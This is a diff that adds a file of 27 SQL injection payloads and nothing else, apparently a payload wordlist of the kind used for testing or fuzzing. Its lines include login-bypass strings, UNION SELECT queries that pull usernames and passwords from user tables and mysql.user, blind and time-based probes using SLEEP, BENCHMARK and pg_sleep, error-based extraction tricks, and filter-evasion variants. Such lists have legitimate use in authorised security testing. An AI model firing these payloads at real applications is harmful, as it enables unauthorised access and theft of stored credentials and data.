@@ -1,0 +1,27 @@
+' OR '1'='1' --
+' OR '1'='1'#
+' OR '1'='1'/*
+" OR "1"="1" --
+' OR '1'='1' OR ''='
+admin' --
+' UNION SELECT null, username, password FROM users --
+' UNION SELECT 1,2,3,4,5 FROM information_schema.tables --
+' UNION SELECT database(), user(), version() --
+' UNION SELECT username, password FROM mysql.user --
+' AND 1=1 --
+' AND 1=2 --
+' AND (SELECT COUNT(*) FROM users) > 0 --
+' AND (SELECT database())='mydb' --
+' OR IF(1=1, SLEEP(5), 0) --
+' OR BENCHMARK(5000000, MD5('test')) --
+" OR pg_sleep(10) --
+' AND 1=CONVERT(int, (SELECT @@version)) --
+' AND extractvalue(1, concat(0x7e, (SELECT database()))) --
+' AND updatexml(1, concat(0x7e, (SELECT version())), 1) --
+'/**/OR/**/1=1 --
+'%20OR%201=1 --
+' OR "a"="a"
+' OR 1=1-- -
+' OR 1=1#
+' OR 1=1/*
+' OR "1"="1" -- -
